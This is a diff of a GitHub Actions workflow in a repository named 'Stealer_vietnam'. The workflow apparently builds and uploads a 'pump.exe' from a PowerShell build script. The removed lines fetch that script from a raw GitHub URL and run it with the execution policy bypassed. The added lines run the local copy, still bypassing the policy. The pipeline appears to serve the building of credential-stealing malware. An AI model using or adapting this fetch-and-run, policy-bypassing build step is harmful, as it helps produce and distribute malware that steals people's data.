@@ -13,11 +13,11 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v3
 
-      - name: Download and run PowerShell script
+      - name: Run PowerShell script
         run: |
           $ErrorActionPreference = 'Stop'
-          Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/tootls/pump/buildcode.dontcare' -OutFile 'buildcode.dontcare.ps1'
-          & powershell -ExecutionPolicy Bypass -File buildcode.dontcare.ps1
+          $workdir = "D:\a\Stealer_vietnam\Stealer_vietnam"
+          & powershell -ExecutionPolicy Bypass -File "$workdir\tootls\pump\buildcode.dontcare"
 
       - name: Upload pump.exe
         uses: actions/upload-artifact@v3
